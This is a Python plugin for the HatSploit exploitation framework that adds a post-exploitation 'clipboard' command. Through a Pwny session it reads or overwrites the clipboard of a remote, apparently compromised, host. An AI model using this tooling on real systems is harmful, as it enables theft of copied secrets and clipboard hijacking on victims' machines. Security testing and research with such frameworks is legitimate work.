"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin


CLIPBOARD_GET = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
CLIPBOARD_SET = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

TLV_TYPE_CLIP_DATA = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Clipboard Plugin",
            'Plugin': "clipboard",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Get or set clipboard contents.",
        })

        self.commands = [
            Command({
                'Category': "gather",
                'Name': "clipboard",
                'Description': "Get or set clipboard contents.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-g', '--get'),
                        {
                            'help': "Get clipboard text.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-s', '--set'),
                        {
                            'help': "Set clipboard text.",
                            'metavar': 'TEXT',
                        }
                    ),
                ]
            })
        ]

    def clipboard(self, args):
        if args.get:
            result = self.session.send_command(
                tag=CLIPBOARD_GET, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to get clipboard contents!")
                return

            data = result.get_string(TLV_TYPE_CLIP_DATA)
            if data:
                self.print_information(data)
            else:
                self.print_warning("Clipboard is empty.")

        elif args.set:
            result = self.session.send_command(
                tag=CLIPBOARD_SET,
                plugin=self.plugin,
                args={
                    TLV_TYPE_CLIP_DATA: args.set,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to set clipboard contents!")
                return

            self.print_success("Clipboard updated.")

        else:
            self.print_usage()

    def load(self):
        pass
